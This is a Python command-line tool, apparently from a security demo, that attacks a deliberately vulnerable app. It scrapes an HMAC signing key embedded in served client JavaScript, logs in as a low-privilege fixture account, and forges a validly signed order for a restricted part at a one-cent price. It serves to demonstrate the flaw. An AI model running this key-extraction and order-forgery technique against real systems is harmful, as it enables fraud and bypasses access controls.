"""Browserless attacker CLI — one tool, one subcommand per client-side sink.

The logic lives in plain functions that take an ``httpx.Client``, so the scenarios are
testable without simulating terminal input. ``main`` only parses arguments and prints.
"""

from __future__ import annotations

import argparse
import json
import re
import sys
from collections.abc import Sequence
from dataclasses import dataclass, field

import httpx

from ..signing import canonical_order_string, sign

# Public fixture credentials for the low-privilege insider the demo casts as the attacker.
DEFAULT_ACCOUNT = "tech-avery"
DEFAULT_PASSWORD = "avery-ninebark-demo"
DEFAULT_WORK_ORDER = "WO-1001"
RESTRICTED_PART = "PN-7741"

_KEY_RE = re.compile(r'SIGNING_KEY\s*=\s*"([^"]+)"')


@dataclass
class AttackResult:
    sink: str
    extracted_value: str
    extracted_source: str
    request: dict[str, object]
    response_status: int
    response_body: dict[str, object]
    order_state: str | None
    notes: list[str] = field(default_factory=list)

    def render(self) -> str:
        lines = [
            f"# sink: {self.sink}",
            f"extracted: {self.extracted_value}",
            f"  from:    {self.extracted_source}",
            f"request:   {json.dumps(self.request)}",
            f"response:  {self.response_status} {json.dumps(self.response_body)}",
            f"outcome:   order state = {self.order_state}",
        ]
        lines += [f"note:      {n}" for n in self.notes]
        return "\n".join(lines)


def extract_signing_key(client: httpx.Client, base_url: str) -> tuple[str, str]:
    """Read the HMAC key straight out of the served vulnerable client source."""

    source_url = f"{base_url}/static/vulnerable/client.js"
    text = client.get(source_url).text
    match = _KEY_RE.search(text)
    if match is None:
        raise RuntimeError("No embedded signing key found in the served client.")
    return match.group(1), source_url


def login(client: httpx.Client, base_url: str, account: str, password: str) -> None:
    res = client.post(
        f"{base_url}/api/login", json={"account_id": account, "password": password}
    )
    if res.status_code != 200:
        raise RuntimeError(f"Login failed for {account}: {res.status_code}")


def forge_embedded_key_order(
    base_url: str,
    *,
    account: str = DEFAULT_ACCOUNT,
    password: str = DEFAULT_PASSWORD,
    part_number: str = RESTRICTED_PART,
    work_order_id: str = DEFAULT_WORK_ORDER,
    unit_price_cents: int = 1,
    restricted: bool = False,
    quantity: int = 1,
) -> AttackResult:
    """Extract the shipped key, sign a forged order for a restricted part, and submit it."""

    with httpx.Client(timeout=15.0) as client:
        key, source = extract_signing_key(client, base_url)
        login(client, base_url, account, password)

        order: dict[str, object] = {
            "part_number": part_number,
            "quantity": quantity,
            "work_order_id": work_order_id,
            "unit_price_cents": unit_price_cents,
            "restricted": restricted,
            "line_total_cents": unit_price_cents * quantity,
        }
        signature = sign(
            key,
            canonical_order_string(
                part_number=part_number,
                quantity=quantity,
                work_order_id=work_order_id,
                unit_price_cents=unit_price_cents,
                restricted=restricted,
                line_total_cents=unit_price_cents * quantity,
            ),
        )
        res = client.post(
            f"{base_url}/api/orders",
            json=order,
            headers={"X-Ninebark-Signature": signature},
        )
        body = res.json() if res.headers.get("content-type", "").startswith(
            "application/json"
        ) else {}
        return AttackResult(
            sink="embedded-signing-key",
            extracted_value=key,
            extracted_source=source,
            request={"headers": {"X-Ninebark-Signature": signature}, "body": order},
            response_status=res.status_code,
            response_body=body,
            order_state=body.get("state") if isinstance(body, dict) else None,
            notes=[
                "The signature is valid; the server verified it correctly and trusted a "
                "restricted part's false price and restriction flag.",
            ],
        )


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(prog="keyjack-attack", description=__doc__)
    parser.add_argument("--base-url", required=True, help="Target application base URL")
    sub = parser.add_subparsers(dest="sink", required=True)

    ek = sub.add_parser("embedded-key", help="Forge a valid order with the shipped HMAC key")
    ek.add_argument("--account", default=DEFAULT_ACCOUNT)
    ek.add_argument("--password", default=DEFAULT_PASSWORD)
    ek.add_argument("--part", default=RESTRICTED_PART)
    ek.add_argument("--work-order", default=DEFAULT_WORK_ORDER)
    ek.add_argument("--unit-price-cents", type=int, default=1)
    return parser


def main(argv: Sequence[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    if args.sink == "embedded-key":
        result = forge_embedded_key_order(
            args.base_url.rstrip("/"),
            account=args.account,
            password=args.password,
            part_number=args.part,
            work_order_id=args.work_order,
            unit_price_cents=args.unit_price_cents,
        )
        print(result.render())
        return 0
    return 2


if __name__ == "__main__":  # pragma: no cover
    sys.exit(main())
